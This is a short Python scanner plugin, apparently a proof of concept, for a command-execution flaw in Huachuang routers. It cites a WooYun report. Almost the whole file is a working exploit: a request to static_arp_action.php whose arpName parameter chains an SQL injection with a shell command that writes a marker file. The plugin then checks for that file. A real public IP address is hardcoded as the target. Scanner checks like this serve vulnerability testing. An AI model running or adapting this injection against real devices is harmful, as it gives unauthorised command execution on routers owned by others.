#!/usr/bin/env python
# coding: UTF-8

'''
author: yichin
name: 华创路由器命令执行
refer: http://www.wooyun.org/bugs/wooyun-2015-0135123
description:
'''

import urlparse


def assign(service, arg):
    if service == 'huachuang_router':
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)

def audit(arg):
    payload = arg + 'acc/bindipmac/static_arp_action.php?isBind=1&arpName=new&arpIf=1%27%20and%200%20union%20select%20%27a||echo%20testvul_testvul>testvul.txt||b%27--'
    code, head, res, err, _ = curl.curl2(payload)
    if code == 200:
        code, head, res, err, _ = curl.curl2(arg + 'acc/bindipmac/testvul.txt')
        if code == 200 and 'testvul_testvul' in res:
            security_hole('命令执行: ' + payload)
    
if __name__ == '__main__':
    from dummy import *
    audit(assign('huachuang_router','http://118.26.68.2/')[1])